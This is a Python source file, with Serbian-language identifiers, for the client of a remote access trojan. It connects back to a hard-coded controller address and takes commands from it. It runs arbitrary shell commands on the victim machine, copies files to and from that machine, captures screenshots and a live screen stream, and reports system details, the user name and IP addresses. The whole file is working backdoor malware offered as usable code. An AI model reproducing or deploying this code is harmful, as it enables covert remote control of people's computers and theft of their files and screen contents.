import socket,os,platform,getpass,pyautogui,urllib.request,threading

HOST = '192.168.0.12'
PORT = 65432
buffer=1024

vnc_port=3333
klijent_vnc=None
vnc_status=False

def posalji_poruku(poruka):#provereno
    sock.send(str(len(poruka)).encode("utf-8"))
    sock.send(str(poruka).encode("utf-8"))

def primi_poruku():#provereno
    duzina = int(sock.recv(buffer).decode("utf-8"))
    poruka = sock.recv(duzina).decode("utf-8")
    return poruka

def funkcije(komanda):#provereno
    global vnc_status
    odgovor=""
    if komanda=="zatvori":
        exit(0)
    elif komanda=="pomoc":
        odgovor=pomoc()
    elif komanda=="informacije":
        odgovor=informacije()
    elif komanda=="upload":
        odgovor=upload()
    else:
        odgovor=cmd(komanda)
    return str(odgovor)

def pomoc():#provereno
    odgovor="pomoc-prikazuje komande\nzatvori-zatvara konekciju\ninformacije-prikazuje informacije " \
            "o sistemu\nupload-uploaduje fajl na istem mete\ndownload-skida fajl sa metinog racunara" \
            "\nscreenshot-snimak ekrana\nvnc-real time pogled na desktop\nvnc_stop-zatara vnc" \
            "\n\n\nsve ostale komande su direktno prosledjene komandnoj liniji"
    return odgovor

def informacije():#provereno
    ime = platform.system() + " " + platform.release()
    verzija = platform.version()
    try:
        eksterna_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    except Exception as e:
        eksterna_ip=str(e)
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    odgovor="operativni sistem: " + ime + "\nverzija: " + verzija
    korisnik=getpass.getuser()
    odgovor+="\nkorisnik: "+korisnik
    odgovor+="\njavna ip: "+eksterna_ip
    odgovor+="\nprivatna ip: "+host_ip
    odgovor+="\nime hosta: "+host_name
    return odgovor

def download():#provereno
    posalji_poruku('0')
    ime_fajla=primi_poruku()
    if os.path.exists(ime_fajla):
        posalji_poruku("postoji")
        a=primi_poruku()
        try:
            f=open(ime_fajla,'rb')
            bin=f.read()
            f.close()
            posalji_poruku("moze")
            a=primi_poruku()
            bajtovi = bytes(bin)
            duzina = len(bajtovi)
            posalji_poruku(str(duzina))
            a = primi_poruku()
            sock.send(bajtovi)
        except Exception as e:
            posalji_poruku("nemoguce")
    else:
        posalji_poruku("ne postoji")

def screen_shot():#provereno
    moze=""
    try:
        pyautogui.screenshot('screenshot.png')
        f = open("screenshot.png", 'rb')
        bin = f.read()
        f.close()
        moze="moze"
    except Exception as e:
        moze=str(e)
    posalji_poruku(moze)
    a=primi_poruku()
    if moze=="moze":
        globals()
        bajtovi = bytes(bin)
        duzina = len(bajtovi)
        posalji_poruku(str(duzina))
        a=primi_poruku()
        sock.send(bajtovi)
        try:
            os.remove("screenshot.png")
        except Exception as e:
            a=str(e)

def upload():#provereno
    posalji_poruku('1')
    ime=primi_poruku()
    posalji_poruku('1')
    duzina=int(primi_poruku())
    print(str(duzina))
    posalji_poruku('1')
    bajtovi=sock.recv(duzina)
    while len(bajtovi) < duzina:
        bajtovi += sock.recv(duzina - len(bajtovi))
    try:
        f=open(ime,'wb')
        f.write(bajtovi)
        f.close()
        odgovor="uploadovano"
    except Exception as e:
        odgovor=e
    return odgovor

def cmd(komanda):#provereno
    odgovor=""
    if komanda[:2] == "cd" and len(komanda)>=3:
        try:
            os.chdir(komanda[3:])
            return str(os.popen("cd").read())
        except Exception as e:
            return "error: "+str(e)
    elif komanda[:5]=="start":
        try:
            print(komanda[6:])
            odgovor=os.startfile(komanda[6:])
            return str(odgovor)
        except Exception as e:
            odgovor=str(e)
            return odgovor
    else:
        try:
            odgovor=str(os.popen(komanda).read())
            return str(odgovor)
        except Exception as e:
            return "error: "+str(e)

def konektuj_vnc():
    globals()
    klijent_vnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    klijent_vnc.connect((HOST, vnc_port))
    #return klijent_vnc
    vnc(klijent_vnc)

def vnc(klijent_vnc):
    while True:
        print("vnc")
        odg = ""
        try:
            pyautogui.screenshot('screenshot.png')
            f = open("screenshot.png", 'rb')
            bin = f.read()
            f.close()
            odg = "ok"
        except Exception as e:
            odg = str(e)
            posalji_poruku_vnc(odg,klijent_vnc)
        if odg == "ok":
            posalji_poruku_vnc(odg,klijent_vnc)
            a = primi_poruku_vnc(klijent_vnc)
            bajtovi = bytes(bin)
            duzina = len(bajtovi)
            posalji_poruku_vnc(str(duzina),klijent_vnc)
            a = primi_poruku_vnc(klijent_vnc)
            klijent_vnc.send(bajtovi)
            ok = primi_poruku_vnc(klijent_vnc)

def posalji_poruku_vnc(poruka, klijent_vnc):
    klijent_vnc.send(str(len(poruka)).encode("utf-8"))
    klijent_vnc.send(str(poruka).encode("utf-8"))

def primi_poruku_vnc(klijent_vnc):
    duzina = int(klijent_vnc.recv(buffer).decode("utf-8"))
    poruka = klijent_vnc.recv(duzina).decode("utf-8")
    return poruka


def konektuj():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    return client

sock=konektuj()

while True:
    komanda=primi_poruku()
    if komanda=="download":
        download()
    elif komanda=="screenshot":
        screen_shot()
    elif komanda=="vnc":

        thread = threading.Thread(target=konektuj_vnc, args=())
        thread.start()
    else:
        odgovor=funkcije(komanda)
        posalji_poruku(odgovor)